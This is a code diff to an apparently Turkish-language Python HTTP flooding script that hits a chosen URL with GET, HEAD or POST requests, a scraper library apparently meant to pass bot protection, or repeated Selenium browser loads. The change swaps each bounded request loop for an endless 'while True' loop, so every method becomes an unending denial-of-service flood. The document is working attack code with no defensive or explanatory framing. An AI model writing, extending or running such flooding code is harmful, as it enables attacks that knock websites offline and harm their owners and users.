@@ -18,7 +18,7 @@ cf=str(input("Method Seçiniz: "))
 if cf =="2":
     def ch():
         he = { 'User-Agent': 'Mozilla/5.0', }
-        for i in range(bot):
+        while True:
             try:
                 x = requests.get(url, headers=he).text
             except:
@@ -26,7 +26,7 @@ if cf =="2":
 elif cf =="1":
     def ch():
         he = { 'User-Agent': 'Mozilla/5.0', }
-        for i in range(bot):
+        while True:
             try:
                 x = requests.head(url ,headers=he).text
             except:
@@ -34,7 +34,7 @@ elif cf =="1":
 elif cf =="3":
     def ch():
         he = { 'User-Agent': 'Mozilla/5.0', }
-        for i in range(bot):
+        while True:
             try:
                 x = requests.post(url,headers=he).text
             except:
@@ -46,7 +46,7 @@ elif cf =="4":
     mt=str(input("Method Seçiniz: "))
     def ch():
         he = { 'User-Agent': 'Mozilla/5.0', }
-        for i in range(bot):
+        while True:
             try:
                 if mt=="1":
                     x = scraper.head(url,headers=he).text
@@ -58,7 +58,7 @@ elif cf =="4":
                     pass
 if cf=="5":
     driver = webdriver.Chrome(executable_path='./chromedriver')
-    for i in range(bot):
+    while True:
         try:
             driver.get(url)
         except:
